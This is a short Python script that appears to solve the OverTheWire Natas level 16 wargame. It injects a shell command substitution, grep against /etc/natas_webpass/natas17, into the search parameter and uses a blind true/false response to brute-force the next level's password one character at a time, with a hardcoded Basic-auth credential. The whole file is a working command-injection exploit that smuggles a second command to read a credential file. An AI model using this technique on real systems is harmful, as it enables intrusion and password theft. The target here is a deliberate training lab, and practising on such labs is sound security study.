import requests
import re
import os

def check(str):
    url = f'http://natas16.natas.labs.overthewire.org/?needle=$(grep -v ^{str} /etc/natas_webpass/natas17)&submit=Search'
    html_text = requests.get(url, headers={'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}).text

    return bool(re.search('African', html_text))

alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

p = ''

for _ in range(32):
    for letter in alphabet:
        os.system('clear')
        print(f'cracked: {p}, current letter: {letter}');
        if (check(p + letter)):
            p += letter;
